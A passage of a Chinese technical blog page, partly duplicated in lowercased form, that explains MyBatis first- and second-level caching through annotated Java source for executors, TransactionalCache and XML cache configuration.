getTransactionalCache(cache).clear();\n    }\n\n    /**\n     * 得到某个TransactionalCache的值\n     */\n    public Object getObject(Cache cache, CacheKey key) {\n        return getTransactionalCache(cache).getObject(key);\n    }\n\n    public void putObject(Cache cache, CacheKey key, Object value) {\n        getTransactionalCache(cache).putObject(key, value);\n    }\n\n    /**\n     * 提交时全部提交\n     */\n    public void commit() {\n        for (TransactionalCache txCache : transactionalCaches.values()) {\n            txCache.commit();\n        }\n    }\n\n    /**\n     * 回滚时全部回滚\n     */\n    public void rollback() {\n        for (TransactionalCache txCache : transactionalCaches.values()) {\n            txCache.rollback();\n        }\n    }\n\n    private TransactionalCache getTransactionalCache(Cache cache) {\n        TransactionalCache txCache = transactionalCaches.get(cache);\n        if (txCache == null) {\n            txCache = new TransactionalCache(cache);\n            transactionalCaches.put(cache, txCache);\n        }\n        return txCache;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\npublic class TransactionalCache implements Cache {\n\n    private Cache delegate;\n    // commit 时要不要清缓存\n    private boolean clearOnCommit;\n    // commit 时要添加的元素\n    private Map<Object, Object> entriesToAddOnCommit;\n    private Set<Object> entriesMissedInCache;\n\n    public TransactionalCache(Cache delegate) {\n        // delegate = FifoCache\n        this.delegate = delegate;\n        // 默认 commit 时不清缓存\n        this.clearOnCommit = false;\n        this.entriesToAddOnCommit = new HashMap<>();\n        this.entriesMissedInCache = new HashSet<>();\n    }\n\n    @Override\n    public String getId() {\n        return delegate.getId();\n    }\n\n    @Override\n    public int getSize() {\n        return delegate.getSize();\n    }\n\n    @Override\n    public Object getObject(Object key) {\n        // key：CacheKey 拼装后的哈希码\n        Object object = delegate.getObject(key);\n        if (object == null) {\n            entriesMissedInCache.add(key);\n        }\n        return clearOnCommit ? null : object;\n    }\n\n    @Override\n    public void putObject(Object key, Object object) {\n        entriesToAddOnCommit.put(key, object);\n    }\n\n    @Override\n    public Object removeObject(Object key) {\n        return null;\n    }\n\n    @Override\n    public void clear() {\n        clearOnCommit = true;\n        entriesToAddOnCommit.clear();\n    }\n\n    public void commit() {\n        if (clearOnCommit) {\n            delegate.clear();\n        }\n        flushPendingEntries();\n        reset();\n    }\n\n    public void rollback() {\n        unlockMissedEntries();\n        reset();\n    }\n\n    private void reset() {\n        clearOnCommit = false;\n        entriesToAddOnCommit.clear();\n        entriesMissedInCache.clear();\n    }\n\n    /**\n     * 刷新数据到 MappedStatement#Cache 中，也就是把数据填充到 Mapper XML 级别下。\n     * flushPendingEntries 方法把事务缓存下的数据，填充到 FifoCache 中。\n     */\n    private void flushPendingEntries() {\n        for (Map.Entry<Object, Object> entry : entriesToAddOnCommit.entrySet()) {\n            delegate.putObject(entry.getKey(), entry.getValue());\n        }\n        for (Object entry : entriesMissedInCache) {\n            if (!entriesToAddOnCommit.containsKey(entry)) {\n                delegate.putObject(entry, null);\n            }\n        }\n    }\n\n    private void unlockMissedEntries() {\n        for (Object entry : entriesMissedInCache) {\n            delegate.putObject(entry, null);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n\n\n其实上面饶了一圈下来，最终操作的是 MappedStatement 维护的 Cache 对象， MappedStatement 是被全局 Configuration 在缓存的，所以查询结束不会清除 MappedStatement 对象和缓存信息，只有当触发 update，commit，rollback 等才会清除 MappedStatement 里维护的缓存信息',normalizedContent:'mybatis 的缓存分为一级缓存和二级缓存，缓存情况如下图，单服务架构中（有且仅有只有一个程序提供相同服务），一级缓存开启不会影响业务，只会提高性能。 微服务架构中需要关闭一级缓存，原因：service1 先查询数据，若之后 service2 修改了数据，之后 service1 又再次以同样的查询条件查询数据，因走缓存会出现查处的数据不是最新数据\n\n\n\n\n# 一级缓存\n\n一级缓存是基于 sqlsession 级别的，在同一个 session 的相同查询语句会才会从缓存中查询，所谓相同包括 sql 相同，条件相同等，那么我们看下在源码中具体是怎么维护和使用这个缓存的。\n\n\n# 解析\n\n描述一级缓存只需要在 <configuration> 标签中描述即可，而一级缓存的 value 值有 session 和 statement 两种，如果设置为 statement 关闭一级缓存，一级缓存是 mybatis 提供的默认缓存\n\n<configuration>\n    <settings>\n        \x3c!--缓存级别：session/statement--\x3e\n        <setting name="localcachescope" value="session"/>\n    </settings>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n\n\n解析核心代码会得到 localcachescope的值 ，维护到 configuration 全局配置中\n\nprivate void settingselement(element context) {\n    if (context == null) return;\n    list<element> elements = context.elements();\n    properties props = new properties();\n    for (element element : elements) {\n        props.setproperty(element.attributevalue("name"), element.attributevalue("value"));\n    }\n    // 是否启用二级缓存\n    configuration.setcacheenabled(booleanvalueof(props.getproperty("cacheenabled"), true));\n    // 一级缓存的配置\n    configuration.setlocalcachescope(localcachescope.valueof(props.getproperty("localcachescope")));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 准备\n\n准备阶段主要是在 opensession 方法，他会在执行器里面去直接 new perpetualcache 永久缓存，执行器就拥有了这个缓存对象\n\n// 打开一个 session\n@override\npublic sqlsession opensession() {\n    transaction tx = null;\n    try {\n        final environment environment = configuration.getenvironment();\n        transactionfactory transactionfactory = environment.gettransactionfactory();\n        tx = transactionfactory.newtransaction(configuration.getenvironment().getdatasource(), transactionisolationlevel.read_committed, false);\n        // 创建执行器\n        final executor executor = configuration.newexecutor(tx);\n        // 创建defaultsqlsession\n        return new defaultsqlsession(configuration, executor);\n    } catch (exception e) {\n        try {\n            assert tx != null;\n            tx.close();\n        } catch (sqlexception ignore) {\n        }\n        throw new runtimeexception("error opening session.  cause: " + e);\n    }\n}\n\n// 创建执行器\npublic executor newexecutor(transaction transaction) {\n    executor executor = new simpleexecutor(this, transaction);\n    // 配置开启二级缓存，创建 cachingexecutor(默认就是有缓存)装饰者模式，\n    if (cacheenabled) {\n        executor = new cachingexecutor(executor);\n    }\n    return executor;\n}\n\n// simpleexecutor 简单执行器的构造方法\npublic class simpleexecutor extends baseexecutor {\n    public simpleexecutor(configuration configuration, transaction transaction) {\n        super(configuration, transaction);\n    }\n}\n\n// 基础执行器的构造方法\nprotected baseexecutor(configuration configuration, transaction transaction) {\n    this.configuration = configuration;\n    this.transaction = transaction;\n    this.wrapper = this;\n    // new 一个永久缓存\n    this.localcache = new perpetualcache("localcache");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\nperpetualcache 继承了 cache ，并实现了基本的对缓存的操作\n\npublic class perpetualcache implements cache {\n    private string id;\n    // 使用hashmap存放一级缓存数据，session 生命周期较短，正常情况下数据不会一直在缓存存放\n    private map<object, object> cache = new hashmap<>();\n    public perpetualcache(string id) {\n        this.id = id;\n    }\n    @override\n    public string getid() {\n        return id;\n    }\n    @override\n    public void putobject(object key, object value) {\n        cache.put(key, value);\n    }\n    @override\n    public object getobject(object key) {\n        return cache.get(key);\n    }\n    @override\n    public object removeobject(object key) {\n        return cache.remove(key);\n    }\n    @override\n    public void clear() {\n        cache.clear();\n    }\n    @override\n    public int getsize() {\n        return cache.size();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 执行\n\n在准备阶段已经得到了执行器，并在执行器里面得到了 perpetualcache 缓存，只需要知道客户使用的是查询还是修改等操作后，执行执行器里面对应的 query or update 方法即可，核心看 query\n\npublic abstract class baseexecutor implements executor {\n\n    private org.slf4j.logger logger = loggerfactory.getlogger(baseexecutor.class);\n\n    protected configuration configuration;\n    protected transaction transaction;\n    protected executor wrapper;\n\n    // 本地缓存\n    protected perpetualcache localcache;\n\n    private boolean closed;\n    // 查询堆栈\n    protected int querystack = 0;\n\n    protected baseexecutor(configuration configuration, transaction transaction) {\n        this.configuration = configuration;\n        this.transaction = transaction;\n        this.wrapper = this;\n        this.localcache = new perpetualcache("localcache");\n    }\n\n    @override\n    public int update(mappedstatement ms, object parameter) throws sqlexception {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        clearlocalcache();\n        return doupdate(ms, parameter);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler) throws sqlexception {\n        // 1. 获取绑定sql\n        boundsql boundsql = ms.getboundsql(parameter);\n        // 2. 创建缓存key\n        cachekey key = createcachekey(ms, parameter, rowbounds, boundsql);\n        return query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, cachekey key, boundsql boundsql) throws sqlexception {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        // 清理局部缓存，查询堆栈为0则清理。querystack 避免递归调用清理\n        if (querystack == 0 && ms.isflushcacherequired()) {\n            clearlocalcache();\n        }\n        list<e> list;\n        try {\n            querystack++;\n            // 根据cachekey从localcache中查询数据\n            list = resulthandler == null ? (list<e>) localcache.getobject(key) : null;\n            if (list == null) {\n                list = queryfromdatabase(ms, parameter, rowbounds, resulthandler, key, boundsql);\n            }\n        } finally {\n            querystack--;\n        }\n        if (querystack == 0) {\n            // 如果不是 session 模式，则清除缓存\n            if (configuration.getlocalcachescope() == localcachescope.statement) {\n                clearlocalcache();\n            }\n        }\n        return list;\n    }\n\n    private <e> list<e> queryfromdatabase(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, cachekey key, boundsql boundsql) throws sqlexception {\n        list<e> list;\n        localcache.putobject(key, executionplaceholder.execution_placeholder);\n        try {\n            list = doquery(ms, parameter, rowbounds, resulthandler, boundsql);\n        } finally {\n            localcache.removeobject(key);\n        }\n        // 存入缓存\n        localcache.putobject(key, list);\n        return list;\n    }\n\n    protected abstract int doupdate(mappedstatement ms, object parameter) throws sqlexception;\n\n    protected abstract <e> list<e> doquery(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, boundsql boundsql) throws sqlexception;\n\n    @override\n    public transaction gettransaction() {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        return transaction;\n    }\n\n    @override\n    public void commit(boolean required) throws sqlexception {\n        if (closed) {\n            throw new runtimeexception("cannot commit, transaction is already closed");\n        }\n        clearlocalcache();\n        if (required) {\n            transaction.commit();\n        }\n    }\n\n    @override\n    public void rollback(boolean required) throws sqlexception {\n        if (!closed) {\n            try {\n                clearlocalcache();\n            } finally {\n                if (required) {\n                    transaction.rollback();\n                }\n            }\n        }\n    }\n\n    @override\n    public void clearlocalcache() {\n        if (!closed) {\n            localcache.clear();\n        }\n    }\n\n    @override\n    public cachekey createcachekey(mappedstatement ms, object parameterobject, rowbounds rowbounds, boundsql boundsql) {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        cachekey cachekey = new cachekey();\n        cachekey.update(ms.getid());\n        cachekey.update(rowbounds.getoffset());\n        cachekey.update(rowbounds.getlimit());\n        cachekey.update(boundsql.getsql());\n        list<parametermapping> parametermappings = boundsql.getparametermappings();\n        typehandlerregistry typehandlerregistry = ms.getconfiguration().gettypehandlerregistry();\n        for (parametermapping parametermapping : parametermappings) {\n            object value;\n            string propertyname = parametermapping.getproperty();\n            if (boundsql.hasadditionalparameter(propertyname)) {\n                value = boundsql.getadditionalparameter(propertyname);\n            } else if (parameterobject == null) {\n                value = null;\n            } else if (typehandlerregistry.hastypehandler(parameterobject.getclass())) {\n                value = parameterobject;\n            } else {\n                metaobject metaobject = configuration.newmetaobject(parameterobject);\n                value = metaobject.getvalue(propertyname);\n            }\n            cachekey.update(value);\n        }\n        if (configuration.getenvironment() != null) {\n            cachekey.update(configuration.getenvironment().getid());\n        }\n        return cachekey;\n    }\n\n    @override\n    public void setexecutorwrapper(executor executor) {\n        this.wrapper = wrapper;\n    }\n\n    @override\n    public void close(boolean forcerollback) {\n        try {\n            try {\n                rollback(forcerollback);\n            } finally {\n                transaction.close();\n            }\n        } catch (sqlexception e) {\n            logger.warn("unexpected exception on closing transaction.  cause: " + e);\n        } finally {\n            transaction = null;\n            localcache = null;\n            closed = true;\n        }\n    }\n\n    protected void closestatement(statement statement) {\n        if (statement != null) {\n            try {\n                statement.close();\n            } catch (sqlexception ignore) {\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n\n\n可以看到 执行器里面维护了 query update commit 等方法，在执行查询的时候会先生成 cachekey ，会按照 namespace.id + 分页offset + 分页limit + 执行的sql语句 + 查询条件的值 + 环境id 生成唯一的 key，然后做为查询缓存的 key，查询结果做为 value，如果同一各 sqlsession 执行相同语句和条件以及分页等，就会从缓存中命中并返回结果。缓存的清除，就是当该 sqlsession 执行 update，commit，close，rollback 时该 sqlsession 就清除缓存。\n\n在 sql 语句中也可以设置清除缓存，只需要在 <select>、<insert> 和 <update> 等 sql 标签中设置 flushcache="true" 属性会强制清空本地缓存，使得下次查询时重新从数据库中获取数据。适用于一级缓存和二级缓存\n\n<select id="selectbyid" resulttype="com.example.user" flushcache="true">\n  select * from user where id = #{id}\n</select>\n\n\n1\n2\n3\n\n\n还有就是在 query 查询中，当如果你设置 localcachescope = statement 时，在 query 也会自动清除缓存，也就是我们所说的关闭一级缓存的方法\n\n\n# 二级缓存\n\n二级缓存是为 namespace 也叫 mapper 级别的缓存，是跨 sqlsession 的，他会在原有的执行器上封装一个 cachingexecutor ，来管理缓存， cachingexecutor 使用了装饰器模式来装饰基础的 executor 执行器。\n\n\n# 解析\n\n在二级缓存中的配置方式具体如下\n\n\x3c!-- 必须先开启缓存 --\x3e\n<configuration>\n    <settings>\n        \x3c!--  true/false 二级缓存是否使用 --\x3e\n        <setting name="cacheenabled" value="true"/>\n    </settings>\n</configuration>\n\n\x3c!-- 指定在某个mapper中使用 --\x3e\n<mapper namespace="com.example.mymapper">\n    \x3c!-- 设置该mapper的二级缓存 --\x3e\n    <cache eviction="lru" flushinterval="100000" readonly="true" size="1024"/>\n    \x3c!-- usecache：表示是否使用二级缓存，如果设置为 true，则会使用二级缓存。对于 select 元素，默认值为 true。 --\x3e\n    \x3c!-- usecache 属性只能控制是否使用二级缓存，它不能关闭一级缓存。一级缓存是 mybatis 的默认行为，它总是开启的，无法关闭。 --\x3e\n    <select id="queryactivitybyid" parametertype="cn.bugstack.mybatis.test.po.activity" flushcache="false" usecache="true">\n        select activity_id, activity_name, activity_desc, create_time, update_time\n        from activity\n        <trim prefix="where" prefixoverrides="and | or" suffixoverrides="and">\n            <if test="null != activityid">\n                activity_id = #{activityid}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n其中 <cache > 标签有多个属性，这里一一介绍一下：\n\n * type：可以指定自定义缓存，但是该类必须实现，而且是全类名\n * eviction：缓存回收策略，默认为 lru（least recently used），策略介绍如下：\n   lru：按照访问时间排序，最近未使用的数据优先清除。\n   fifo：按照插入时间排序，先插入的数据先清除。\n   soft：基于垃圾回收算法，当系统内存不足时，会优先清理不常用的、占用内存较多的数据。\n   weak：弱引用机制，当 jvm 进行垃圾回收时，如果判断一个对象只被弱引用指向，则会将其回收。\n * flushinterval：刷新间隔时间，表示多长时间刷新一次缓存，单位为毫秒，默认不刷新。\n * size：缓存的大小，表示最多可以缓存多少个对象。\n * readonly：是否只读，默认为 false，表示启用缓存更新机制。\n * blocking：是否启用阻塞，默认为 false，表示不启用。\n\n> flushinterval 默认情况下，mybatis 采用基于 perpetualcache (永久缓存) 的缓存实现方式，即缓存会一直保存在内存中，直到会话关闭时才被清除。而当我们使用基于 ehcache 的缓存实现时，可以通过设置 flushinterval 属性控制缓存的刷新时间，即定时将缓存中的数据写入到磁盘或持久化存储中，以避免缓存过期、失效或内存溢出等问题。\n\n当 mybaits 启动后会读到二级缓存的配置，先会进行 <cache> 基础的解析，得到 xml 里面的属性值，其次用值信息组成一个 cache 对象，并把这个 cache 对象维护到全局配置 configuration 中，该全局配置里面是维护一个 map 结构的容器\n\n// 开始解析\nprivate void cacheelement(element context) {\n    if (context == null) return;\n    // 基础配置信息，默认是永恒缓存\n    string type = context.attributevalue("type", "perpetual");\n    class<? extends cache> typeclass = typealiasregistry.resolvealias(type);\n    // 缓存队列 fifo\n    string eviction = context.attributevalue("eviction", "fifo");\n    class<? extends cache> evictionclass = typealiasregistry.resolvealias(eviction);\n    long flushinterval = long.valueof(context.attributevalue("flushinterval"));\n    integer size = integer.valueof(context.attributevalue("size"));\n    boolean readwrite = !boolean.parseboolean(context.attributevalue("readonly", "false"));\n    boolean blocking = !boolean.parseboolean(context.attributevalue("blocking", "false"));\n\n    // 解析额外属性信息；<property name="cachefile" value="/tmp/xxx-cache.tmp"/>\n    list<element> elements = context.elements();\n    properties props = new properties();\n    for (element element : elements) {\n        props.setproperty(element.attributevalue("name"), element.attributevalue("value"));\n    }\n    // 构建缓存\n    builderassistant.usenewcache(typeclass, evictionclass, flushinterval, size, readwrite, blocking, props);\n}\n\n// 构建cache\npublic cache usenewcache(class<? extends cache> typeclass,\n                        class<? extends cache> evictionclass,\n                        long flushinterval,\n                        integer size,\n                        boolean readwrite,\n                        boolean blocking,\n                        properties props) {\n    // 判断为null，则用默认值\n    typeclass = valueordefault(typeclass, perpetualcache.class);\n    evictionclass = valueordefault(evictionclass, fifocache.class);\n\n    // 建造者模式构建 cache [currentnamespace=cn.bugstack.mybatis.test.dao.iactivitydao]\n    cache cache = new cachebuilder(currentnamespace)\n            .implementation(typeclass)\n            .adddecorator(evictionclass)\n            .clearinterval(flushinterval)\n            .size(size)\n            .readwrite(readwrite)\n            .blocking(blocking)\n            .properties(props)\n            .build();\n\n    // 添加缓存\n    configuration.addcache(cache);\n    // 给自己维护一个 cache 以便后续 mappedstatement 用到\n    currentcache = cache;\n    return cache;\n}\n\n// 添加到 configuration全局配置维护的 caches中\npublic class configuration {\n    // 缓存,存在map里\n    protected final map<string, cache> caches = new hashmap<>();\n    public void addcache(cache cache) {\n        caches.put(cache.getid(), cache);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n缓存解析过了，但是最主要的还是 <select> 标签着一些，标签上面描述了具体的缓存是否使用，缓存是否清除，所以还需要解析标签上的缓存信息，主要是 flushcache 和 usecache 这两个属性\n\n// 解析操作\npublic void parsestatementnode() {\n    string id = element.attributevalue("id");\n    // 参数类型\n    string parametertype = element.attributevalue("parametertype");\n    class<?> parametertypeclass = resolvealias(parametertype);\n    // 外部应用 resultmap\n    string resultmap = element.attributevalue("resultmap");\n    // 结果类型\n    string resulttype = element.attributevalue("resulttype");\n    class<?> resulttypeclass = resolvealias(resulttype);\n    // 获取命令类型(select|insert|update|delete)\n    string nodename = element.getname();\n    sqlcommandtype sqlcommandtype = sqlcommandtype.valueof(nodename.touppercase(locale.english));\n\n    boolean isselect = sqlcommandtype == sqlcommandtype.select;\n    boolean flushcache = boolean.parseboolean(element.attributevalue("flushcache", string.valueof(!isselect)));\n    boolean usecache = boolean.parseboolean(element.attributevalue("usecache", string.valueof(isselect)));\n\n    // 获取默认语言驱动器\n    class<?> langclass = configuration.getlanguageregistry().getdefaultdriverclass();\n    languagedriver langdriver = configuration.getlanguageregistry().getdriver(langclass);\n\n    // 解析<selectkey> step-14 新增\n    processselectkeynodes(id, parametertypeclass, langdriver);\n\n    // 解析成sqlsource，dynamicsqlsource/rawsqlsource\n    sqlsource sqlsource = langdriver.createsqlsource(configuration, element, parametertypeclass);\n\n    // 属性标记【仅对 insert 有用】, mybatis 会通过 getgeneratedkeys 或者通过 insert 语句的 selectkey 子元素设置它的值 step-14 新增\n    string keyproperty = element.attributevalue("keyproperty");\n\n    keygenerator keygenerator = null;\n    string keystatementid = id + selectkeygenerator.select_key_suffix;\n    keystatementid = builderassistant.applycurrentnamespace(keystatementid, true);\n\n    if (configuration.haskeygenerator(keystatementid)) {\n        keygenerator = configuration.getkeygenerator(keystatementid);\n    } else {\n        keygenerator = configuration.isusegeneratedkeys() && sqlcommandtype.insert.equals(sqlcommandtype) ? new jdbc3keygenerator() : new nokeygenerator();\n    }\n    // 调用助手类\n    builderassistant.addmappedstatement(id,\n            sqlsource,\n            sqlcommandtype,\n            parametertypeclass,\n            resultmap,\n            resulttypeclass,\n            flushcache,\n            usecache,\n            keygenerator,\n            keyproperty,\n            langdriver);\n}\n\n// 把信息添加到 mappedstatement对象\npublic mappedstatement addmappedstatement(\n        string id,\n        sqlsource sqlsource,\n        sqlcommandtype sqlcommandtype,\n        class<?> parametertype,\n        string resultmap,\n        class<?> resulttype,\n        boolean flushcache,\n        boolean usecache,\n        keygenerator keygenerator,\n        string keyproperty,\n        languagedriver lang\n) {\n    // 给id加上namespace前缀：cn.bugstack.mybatis.test.dao.iuserdao.queryuserinfobyid\n    id = applycurrentnamespace(id, false);\n    //是否是select语句\n    boolean isselect = sqlcommandtype == sqlcommandtype.select;\n\n    mappedstatement.builder statementbuilder = new mappedstatement.builder(configuration, id, sqlcommandtype, sqlsource, resulttype);\n    statementbuilder.resource(resource);\n    statementbuilder.keygenerator(keygenerator);\n    statementbuilder.keyproperty(keyproperty);\n\n    // 结果映射，给 mappedstatement#resultmaps\n    setstatementresultmap(resultmap, resulttype, statementbuilder);\n    // 维护缓存信息\n    setstatementcache(isselect, flushcache, usecache, currentcache, statementbuilder);\n    mappedstatement statement = statementbuilder.build();\n    // 映射语句信息，建造完存放到配置项中\n    configuration.addmappedstatement(statement);\n    return statement;\n}\n\n// 给statement添加缓存信息\nprivate void setstatementcache(\n        boolean isselect,\n        boolean flushcache,\n        boolean usecache,\n        cache cache,\n        mappedstatement.builder statementbuilder) {\n    flushcache = valueordefault(flushcache, !isselect);\n    usecache = valueordefault(usecache, isselect);\n    statementbuilder.flushcacherequired(flushcache);\n    statementbuilder.usecache(usecache);\n    statementbuilder.cache(cache);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n\n\n在具体的 addmappedstatement 的时候，可以看到会得到一个 mappedstatement 对象，该对象就是封装了 sql 标签的所有信息，在 setstatementcache 方法中，不仅只把 flushcache和usecache 进行了设置，额外的还带有一个 cache ，该 cache 就是在调用 usenewcache 方法，内部赋值的 currentcache ，他们的方法是在同一个类中，因此可以使用。这样 mappedstatement 对象也就拥有了 <cache> 标签的能力，到此解析完毕\n\n\n# 准备\n\n和一级缓存一样，都是在 opensession 的时候去做实例化，但是不同的是，二级缓存会在一级缓存上进行一个装饰，并且首要会判断是否允许开启二级缓存。\n\nif (cacheenabled) {\n    executor = new cachingexecutor(executor);\n}\n\n\n1\n2\n3\n\n\ncachingexecutor 接收 executor ，并对其进行包装，内部方法依然调用的是 baseexecutor 的相关方法。 cachingexecutor 内部还维护了 transactionalcachemanager 事务缓存管理器，该管理器内部维护 map<cache, transactionalcache> ， transactionalcache 内部又维护了 cache 以及 entriesmissedincache 和 entriestoaddoncommit\n\n\n# 执行\n\npublic class cachingexecutor implements executor {\n\n    private logger logger = loggerfactory.getlogger(cachingexecutor.class);\n    private executor delegate;\n    // 事务缓存管理器\n    private transactionalcachemanager tcm = new transactionalcachemanager();\n\n    public cachingexecutor(executor delegate) {\n        this.delegate = delegate;\n        delegate.setexecutorwrapper(this);\n    }\n\n    @override\n    public int update(mappedstatement ms, object parameter) throws sqlexception {\n        return delegate.update(ms, parameter);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, cachekey key, boundsql boundsql) throws sqlexception {\n        cache cache = ms.getcache();\n        if (cache != null) {\n            flushcacheifrequired(ms);\n            if (ms.isusecache() && resulthandler == null) {\n                @suppresswarnings("unchecked")\n                list<e> list = (list<e>) tcm.getobject(cache, key);\n                if (list == null) {\n                    list = delegate.<e>query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n                    // cache：缓存队列实现类，fifo\n                    // key：哈希值 [mappedstatementid + offset + limit + sql + queryparams + environment]\n                    // list：查询的数据\n                    tcm.putobject(cache, key, list);\n                }\n                // 打印调试日志，记录二级缓存获取数据\n                if (logger.isdebugenabled() && cache.getsize() > 0) {\n                    logger.debug("二级缓存：{}", json.tojsonstring(list));\n                }\n                return list;\n            }\n        }\n        return delegate.<e>query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler) throws sqlexception {\n        // 1. 获取绑定sql\n        boundsql boundsql = ms.getboundsql(parameter);\n        // 2. 创建缓存key\n        cachekey key = createcachekey(ms, parameter, rowbounds, boundsql);\n        return query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n    }\n\n    @override\n    public transaction gettransaction() {\n        return delegate.gettransaction();\n    }\n\n    @override\n    public void commit(boolean required) throws sqlexception {\n        delegate.commit(required);\n        tcm.commit();\n    }\n\n    @override\n    public void rollback(boolean required) throws sqlexception {\n        try {\n            delegate.rollback(required);\n        } finally {\n            if (required) {\n                tcm.rollback();\n            }\n        }\n    }\n\n    @override\n    public void close(boolean forcerollback) {\n        try {\n            if (forcerollback) {\n                tcm.rollback();\n            } else {\n                tcm.commit();\n            }\n        } finally {\n            delegate.close(forcerollback);\n        }\n    }\n\n    @override\n    public void clearlocalcache() {\n        delegate.clearlocalcache();\n    }\n\n    @override\n    public cachekey createcachekey(mappedstatement ms, object parameterobject, rowbounds rowbounds, boundsql boundsql) {\n        return delegate.createcachekey(ms, parameterobject, rowbounds, boundsql);\n    }\n\n    @override\n    public void setexecutorwrapper(executor executor) {\n        throw new unsupportedoperationexception("this method should not be called");\n    }\n\n    private void flushcacheifrequired(mappedstatement ms) {\n        cache cache = ms.getcache();\n        if (cache != null && ms.isflushcacherequired()) {\n            tcm.clear(cache);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n\n\npublic class transactionalcachemanager {\n\n    private map<cache, transactionalcache> transactionalcaches = new hashmap<>();\n\n    public void clear(cache cache) {\n        gettransactionalcache(cache).clear();\n    }\n\n    /**\n     * 得到某个transactionalcache的值\n     */\n    public object getobject(cache cache, cachekey key) {\n        return 